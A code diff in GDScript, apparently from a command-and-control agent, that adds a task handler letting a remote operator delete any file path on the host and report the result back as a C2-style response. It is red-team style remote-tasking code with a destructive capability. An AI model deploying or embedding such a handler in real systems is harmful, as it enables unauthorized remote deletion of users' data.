@@ -104,3 +104,41 @@ func _on_tasking_gdscript(task):
 	else:
 		print("bad gdscript task: ", task)
 		# TODO: agent_response in failure cases
+
+func _on_tasking_rm(task):
+
+	if task.has("command") and task.get("command") == "rm" and task.has("parameters"):
+		# TODO: spawn a thread?
+		var parameters = parse_json(task.get("parameters"))
+		var path = parameters.get("path")
+
+		var dir = Directory.new()
+		var ret = dir.remove(path)
+		var output = "Removed path: %s" % path
+		var status = "success"
+		
+		if ret != OK:
+			output = "Error (%d) removing path: %s" % [ret, path]
+			status = "error"
+
+		api.agent_response(
+			to_json({
+				"action": "post_response",
+				"status": status,
+				"completed": true,
+				"responses": [
+					{
+						"task_id": task.get("id"),
+						"user_output": output,
+						"removed_files": [
+							{
+								"path": path
+							}
+						]
+					}
+				]
+			})
+		)
+	else:
+		print("bad rm task: ", task)
+		# TODO: agent_response in failure cases
